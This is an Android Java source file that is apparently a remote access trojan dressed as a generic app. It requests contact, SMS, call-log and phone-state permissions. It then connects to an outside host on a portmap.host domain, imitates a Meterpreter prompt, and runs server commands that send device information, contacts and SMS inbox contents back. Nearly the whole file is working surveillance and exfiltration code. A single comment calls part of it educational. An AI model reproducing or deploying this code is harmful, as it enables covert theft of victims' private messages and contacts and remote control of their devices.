package com.google.myapplication;

import android.Manifest;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.StrictMode;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.Socket;

public class MainActivity extends AppCompatActivity {

    private DataOutputStream toServer = null;
    private BufferedReader fromServer = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Allow network operations on the main thread (for educational purposes only)
        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);

        // Check for permissions
        if (arePermissionsGranted()) {
            // Permissions already granted
            connectToServer();
        } else {
            // Request permissions
            requestPermissions();
        }
    }

    // Check if all required permissions are granted
    private boolean arePermissionsGranted() {
        return ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED &&
                ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED &&
                ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED &&
                ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;
    }

    // Request permissions
    private void requestPermissions() {
        ActivityCompat.requestPermissions(this, new String[]{
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_SMS}, 1);
    }

    // Connect to the server
    // Connect to the server
    private void connectToServer() {
        Thread thread = new Thread(() -> {
            String serverip = "Metasploitkingdfdffdfdf-53144.portmap.host";
            int port = 53144;

            try {
                InetAddress host = InetAddress.getByName(serverip);

                Socket socket = new Socket(host, port);
                toServer = new DataOutputStream(socket.getOutputStream());
                fromServer = new BufferedReader(new InputStreamReader(socket.getInputStream()));

                // Send "meterpreter >" after connection is established
                sendMeterpreterPrompt();

                // Continuously listen for commands from the server
                while (true) {
                    String command = fromServer.readLine();
                    if (command != null) {
                        executeCommand(command);
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        });

        thread.start();
    }

    private void sendMeterpreterPrompt() {
        try {
            // Send "meterpreter >" to server
            toServer.writeBytes("meterpreter > ");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // Execute the command received from the server
    private void executeCommand(String command) {
        try {
            String response;
            switch (command) {
                case "deviceInfo":
                    response = Functions.deviceInfo();
                    break;

                case "getContacts":
                    response = Functions.getContacts(getContentResolver()); // Implement this method
                    break;

                case "readSMS":
                    Functions.readSMS smsReader = new Functions.readSMS(getApplicationContext());
                    response = smsReader.readSMSBox("inbox"); // Modify this based on your requirements
                    break;

                // Implement other cases similarly
                default:
                    response = "Invalid command";
            }
            toServer.writeBytes(response + "\n");

            // Send "meterpreter >" prompt after sending the response
            sendMeterpreterPrompt();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
